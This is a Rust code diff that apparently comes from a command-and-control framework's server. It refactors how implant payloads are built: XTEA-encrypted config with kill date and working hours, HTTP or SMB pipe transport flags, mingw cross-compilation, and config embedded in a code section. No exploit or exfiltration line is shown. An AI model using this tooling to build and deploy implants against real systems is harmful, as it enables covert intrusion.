@@ -3,7 +3,7 @@ use rand::Rng;
 use std::str::FromStr;
 use std::borrow::Borrow;
 use std::collections::HashMap;
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex};
 use std::sync::mpsc::channel;
 
@@ -17,7 +17,7 @@ use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::binary::embed_section_data;
 use crate::server::error::{Error, Result};
 use crate::server::stream::Stream;
-use crate::{return_error, length_check_defer};
+use crate::{return_error, length_check_defer, map_error};
 
 pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     length_check_defer!(args, 3);
@@ -27,23 +27,24 @@ pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
         Err(e)          => return Err(e),
     };
 
-    instance.setup_instance()?;
+    map_error!(instance.setup_instance(), "error setting up instance");
 
-    let ref session = SESSION.lock().unwrap();
+    let ref session = map_error!(SESSION.lock(), "could not lock session");
+
     instance.user_session.username = session.username.clone();
     instance.user_session.is_admin = session.is_admin.clone();
 
     if let Some(network) = &instance.network {
         match network.r#type {
-
-            NetworkType::Http => instance.setup_listener()?,
-            _ => { }
+            NetworkType::Http   => map_error!(instance.setup_listener(), "could not setup listener"),
+            _                   => {}
         }
     }
 
     wrap_message("info", &format!("{} is ready", instance.builder.output_name));
     INSTANCES.lock().unwrap().push(instance);
-    // todo: insert to db
+
+    // todo: insert db
 
     Ok(())
 }
@@ -52,10 +53,10 @@ pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
     length_check_defer!(args, 3);
     // todo: remove from db
 
-    let mut instances   = INSTANCES.lock().map_err(|e| e.to_string())?;
+    let mut instances   = map_error!(INSTANCES.lock(), "could not lock instances");
     if let Some(pos)    = instances.iter().position(|instance| instance.builder.output_name == args[2]) {
 
-        wrap_message("info", &format!("{} removed", instances[pos].builder.output_name));
+        wrap_message("info", &format!("removing {}", instances[pos].builder.output_name));
         instances.remove(pos);
 
         Ok(())
@@ -72,13 +73,13 @@ pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
 }
 
 fn map_config(file_path: &String) -> Result<Hexane> {
-    let json_file = CURDIR.join("json").join(file_path);
+    let json_file   = CURDIR.join("json").join(file_path);
 
     let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;
     let json_data   = serde_json::from_str::<JsonData>(contents.as_str())?;
 
     let mut instance    = Hexane::default();
-    let session         = SESSION.lock().unwrap();
+    let session         = map_error!(SESSION.lock(), "unable to lock sessions");
 
     instance.group_id       = 0;
     instance.main           = json_data.config;
@@ -120,6 +121,7 @@ impl Hexane {
         let hash_file       = "./core/include/names.hpp";
 
         self.compiler.build_directory = format!("./payload/{}", self.builder.output_name);
+
         self.peer_id    = rng.random::<u32>();
         self.group_id   = 0;
 
@@ -130,22 +132,18 @@ impl Hexane {
             self.compiler.compiler_flags = "-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC  -fno-builtin -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections".to_owned();
         }
 
-
         wrap_message("debug", &"creating build directory".to_owned());
-        create_directory(&self.compiler.build_directory)?;
+        map_error!(create_directory(&self.compiler.build_directory), "could not create build directory");
 
         wrap_message("debug", &"generating config data".to_owned());
-        &self.generate_config_bytes()?;
+        map_error!(self.generate_config_bytes(), "unable to generate config bytes");
 
         wrap_message("debug", &"generating string hashes".to_owned());
-        generate_hashes(strings_file, hash_file)?;
-
-        wrap_message("debug", &"generating defintions".to_owned());
-        generate_definitions(&self.compiler.definitions);
+        map_error!(generate_hashes(strings_file, hash_file), "unable to generate hashes");
 
         wrap_message("debug", &"building sources".to_owned());
-        self.compile_sources()?;
-        self.run_server()?;
+        map_error!(self.compile_sources(), "unable to compile sources");
+        map_error!(self.run_server(), "unable to start server");
 
         Ok(())
     }
@@ -166,7 +164,7 @@ impl Hexane {
 
         if self.main.encrypt {
             let patch_cpy   = patch.clone();
-            patch           = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
+            patch           = map_error!(crypt_xtea(&patch_cpy, &self.crypt_key, true), "could not encrypt patch");
         }
 
         self.config_data = patch;
@@ -196,12 +194,12 @@ impl Hexane {
         }
 
         let working_hours = if let Some(ref hours) = self.main.working_hours {
-            i32::from_str(hours)?
+            map_error!(i32::from_str(hours), "invalid integer conversion?")
         }
         else { 0 };
 
         let kill_date = if let Some(ref date) = self.main.killdate {
-            i64::from_str(date)?
+            map_error!(i64::from_str(date), "invalid integer conversion?")
         }
         else { 0 };
 
@@ -247,44 +245,63 @@ impl Hexane {
         Ok(stream.buffer)
     }
 
-    fn compile_object(&mut self, flags: String) -> Result<()> {
-        let mut defs: HashMap<String, Vec<u8>> = HashMap::new();
+    fn compile_object(&mut self, mut command: String, source: String, mut flags: String) -> Result<()> {
+        let mut defs: HashMap<String, Option<u8>> = HashMap::new();
 
-        if self.compiler.command != "ld" && self.compiler.command != "nasm" {
+        if command.trim() != "ld" && command.trim() != "nasm" {
             if self.main.debug {
-                defs.insert("DEBUG".to_string(), vec![]);
+                defs.insert("DEBUG".to_string(), None);
             }
 
-            let arch = &self.main.architecture;
-            match arch {
-                AMD64   => { defs.insert("BSWAP".to_string(), vec![0]); },
-                _       => { defs.insert("BSWAP".to_string(), vec![1]); },
+            if &self.main.architecture == "amd64" {
+                defs.insert("BSWAP".to_string(), Some(0));
+            } else {
+                defs.insert("BSWAP".to_string(), Some(1));
             }
 
             if let Some(network) = &self.network {
                 match network.r#type {
-                    NetworkType::Http   => { defs.insert("TRANSPORT_HTTP".to_string(), vec![]); },
-                    NetworkType::Smb    => { defs.insert("TRANSPORT_PIPE".to_string(), vec![]); },
+                    NetworkType::Http => {
+                        defs.insert("TRANSPORT_HTTP".to_string(), None);
+                    }
+                    NetworkType::Smb => {
+                        defs.insert("TRANSPORT_PIPE".to_string(), None);
+                    }
                 }
             }
         }
 
-        if !self.compiler.components.is_empty() {
-            self.compiler.command += &generate_arguments(self.compiler.components.clone());
-        }
+        let source_path = Path::new(&source);
+
+        let file_name = match source_path.file_name() {
+            Some(name) => name,
+            None => {
+                eprintln!("Error: Could not extract file name from source: {}", source);
+                return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid source file").into());
+            }
+        };
+
+        let mut output_path = PathBuf::from(&self.compiler.build_directory);
+        output_path.push(file_name);
+        output_path.set_extension("o");
+
+        let output_str = match output_path.to_str() {
+            Some(output) => output.replace("/", "\\"),
+            None => {
+                eprintln!("Error: Could not convert output path to string");
+                return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid output path").into());
+            }
+        };
 
         for (k, v) in &defs {
-            self.compiler.command += &generate_definitions(&HashMap::from([(k.clone(), v.clone())]));
+            command.push_str(&generate_definitions(&HashMap::from([(k.clone(), v.clone())])));
         }
 
-        if !flags.is_empty() {
-            self.compiler.command += &flags;
-        }
+        flags.push_str(&format!(" -o {} ", output_str));
+        command.push_str(&flags);
 
-        self.compiler.command += &format!(" -o {} ", self.builder.output_name);
-
-        run_command(&self.compiler.command, &self.peer_id.to_string())?;
-        embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice())?;
+        wrap_message("debug", &format!("Compiling : {:?}\n", &command));
+        map_error!(run_command(&command, &self.peer_id.to_string()), "run_command error");
 
         Ok(())
     }
@@ -293,56 +310,73 @@ impl Hexane {
         let src_path        = Path::new(&self.builder.root_directory).join("src");
         let mut components  = self.compiler.components.clone();
 
-        let mut entries: Vec<_>     = fs::read_dir(src_path)?.filter_map(|entry| entry.ok()).collect();
+        let entries: Vec<_> = map_error!(fs::read_dir(&src_path), "fs::read_dir error")
+            .filter_map(|entry| entry.ok())
+            .filter_map(|entry| fs::canonicalize(entry.path()).ok())
+            .collect();
+
         let (err_send, err_recv)    = channel();
         let atoms                   = Arc::new(Mutex::new(()));
 
-        entries.iter_mut().for_each(|src| {
-            if !src.metadata().map_or(false, |map| map.is_file()) {
+        entries.iter().for_each(|absolute_path| {
+            if !absolute_path.is_file() {
                 return;
             }
 
-            let path            = src.path();
-            let output          = self.builder.output_name.clone();
-            let mut flags       = self.compiler.compiler_flags.clone();
-            let mut command     = self.compiler.command.clone();
+            let output  = self.builder.output_name.clone();
+            let compile = self.compiler.compiler_flags.clone();
+
+            let mut command = String::new();
+            let mut flags   = String::new();
 
             let atoms_clone = Arc::clone(&atoms);
             let err_clone   = err_send.clone();
             let _guard      = atoms_clone.lock().unwrap();
 
-            let source = match src.file_name().to_str() {
-                Some(name)  => src_path.join(name),
-                None        => { eprintln!("Error: Invalid file name"); return; }
+            let absolute_str = match absolute_path.to_str() {
+                Some(path_str) => {
+                    let stripped_path = if path_str.starts_with(r"\\?\") || path_str.starts_with("//?/") {
+                        &path_str[4..]
+                    }
+                    else {
+                        path_str
+                    };
+                    stripped_path.replace("/", "\\")
+                }
+                None => {
+                    eprintln!("Error: Cannot convert path to string: {:?}", absolute_path);
+                    return;
+                }
             };
 
-            match path.extension().and_then(|ext| ext.to_str()) {
+            match absolute_path.extension().and_then(|ext| ext.to_str()) {
                 Some("asm") => {
 
                     command.push_str("nasm");
-                    flags = "-f win64".to_string(); // remove all flags if nasm and add -f arch
-                    flags.push_str(source.to_str().unwrap());
-
-                    wrap_message("debug", &format!("compiling {:?}", &src.file_name().to_str()));
+                    flags = " -f win64 ".to_string();
+                    flags.push_str(&absolute_str);
                 }
 
                 Some("cpp") => {
 
                     command.push_str("x86_64-w64-mingw32-g++");
-                    flags.push_str("-c");
-                    flags.push_str(source.to_str().unwrap());
+                    flags.push_str(" -c ");
+                    flags.push_str(&absolute_str);
 
-                    wrap_message("debug", &format!("compiling {:?}", &src.file_name().to_str()));
-
+                    flags.push_str(" ");
+                    flags.push_str(compile.as_str());
                 }
-                _ => {}
+
+                _ => {
+                    eprintln!("Unknown file extension: {:?}", absolute_path);
+                    return;
+                }
             }
 
-            if let Err(e) = self.compile_object(flags) {
-                eprintln!("unknown: {e}");
+            if let Err(e) = self.compile_object(command, absolute_str.clone(), flags) {
+                eprintln!("Compilation error: {e}");
                 err_clone.send(e).unwrap();
-            }
-            else {
+            } else {
                 components.push(output);
             }
         });
@@ -351,8 +385,10 @@ impl Hexane {
             return_error!("{}", err);
         }
 
-        wrap_message("debug", &"linking final objects".to_owned());
-        // todo: link all objects
+        wrap_message("debug", &"Linking final objects".to_owned());
+        map_error!(embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice()), "embed_section_data error");
+
+        // TODO: link all objects
 
         Ok(())
     }
@@ -366,14 +402,13 @@ pub fn generate_arguments(args: Vec<String>) -> String {
     args.iter().map(|arg| format!(" {} ", arg)).collect::<Vec<_>>().join("")
 }
 
-pub fn generate_definitions(definitions: &HashMap<String, Vec<u8>>) -> String {
-    let mut defs    = String::new();
+pub fn generate_definitions(definitions: &HashMap<String, Option<u8>>) -> String {
+    let mut defs = String::new();
 
     for (name, def) in definitions {
-        if def.is_empty() {
-            defs.push_str(&format!(" -D{} ", name));
-        } else {
-            defs.push_str(&format!(" -D{}={:?} ", name, def));
+        match def {
+            None        => defs.push_str(&format!(" -D{} ", name)),
+            Some(value) => defs.push_str(&format!(" -D{}={} ", name, value)),
         }
     }
 
